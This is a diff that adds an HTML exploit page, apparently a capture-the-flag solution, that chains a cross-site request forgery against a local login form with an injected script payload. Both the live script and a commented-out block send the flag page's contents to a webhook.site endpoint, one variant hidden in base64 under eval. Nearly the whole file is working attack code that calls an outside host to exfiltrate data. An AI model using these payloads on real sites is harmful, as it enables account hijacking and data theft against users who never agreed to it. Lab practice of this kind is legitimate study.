@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<body>
+<div>CSRF Attack Page</div>
+<form method="POST" action="http://web:11202/login" id="attackForm">
+    <input name="username" value="<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script><img src=x ng-on-error=&quot;$event.target.ownerDocument.defaultView.eval('eval(name)')&quot;>{request.session[user][username]}">
+    <input name="password" value="111111111">
+    <input type="submit">
+</form>
+<script>
+const payload = "let w=window.open('','botflag');document.body.appendChild(Object.assign(document.createElement('form'),{action:'https://webhook.site/a5727641-8e02-4fb9-bf6f-67c25902594f/a',method:'POST'})).appendChild(Object.assign(document.createElement('input'),{name:'flag',value:w.document.body.innerHTML})),document.forms[document.forms.length-1].submit();";
+let w = window.open('http://web:11202/flag', 'botflag');
+name = payload;
+document.querySelector('#attackForm').submit();
+</script>
+</body>
+</html>
+
+<!--
+<input name="username" value="<script src=window.s></script><img src=x ng-on-error=&quot;window.eval($event.target.ownerDocument.defaultView.name)&quot;>{request.session[user][username]}">
+setTimeout(() => {
+    let payload = '<script>eval(atob(\"bGV0IGI9d2luZG93Lm9wZW4oJycsJ2JvdGZsYWcnKTtzZXRUaW1lb3V0KCgpPT5mZXRjaCgnaHR0cHM6Ly93ZWJob29rLnNpdGUvYTU3Mjc2NDEtOGUwMi00YmY5LWJmNmYtNjdjMjU5MDI1OTRmP2Q9JytidG9hKGIuZG9jdW1lbnQuYm9keS5pbm5lckhUTUwpKSwyMDAwKQ==\"))<\/script>';
+    location = 'http://localhost:11202/?' + encodeURIComponent(payload);
+}, 3000);
+let w=window.open('','botflag');setTimeout(()=>fetch('https://webhook.site/a5727641-8e02-4fb9-bf6f-67c25902594f?d='+btoa(w.document.body.innerHTML)),2000)
+-->
